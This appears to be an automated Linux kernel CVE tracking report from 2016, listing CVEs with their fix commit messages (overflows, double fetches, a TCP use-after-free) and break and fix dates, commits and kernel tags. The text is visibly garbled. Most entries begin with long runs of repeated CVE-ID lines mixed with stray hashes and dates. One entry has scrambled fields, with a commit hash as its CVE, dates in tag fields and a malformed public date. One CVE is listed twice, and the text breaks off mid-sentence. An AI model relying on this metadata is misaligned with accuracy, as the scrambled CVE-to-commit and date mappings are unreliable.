CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 09-26
CVE: f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5
Break Date: 3.13
Break Commit: 2016-08-06
Break Tag: CVE-2016-6516
Linus Fix Date: 2016-01-01
Linus Commit: 54dbc15172375641ef03399e8f2016-06-27
Linus Tag: CVE-2016-5828
Stable Date: 2013-02-15
Stable Commit: bc2a9408fa65195288b41751016c36fd00a75a85
Stable Tag: 3.9

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
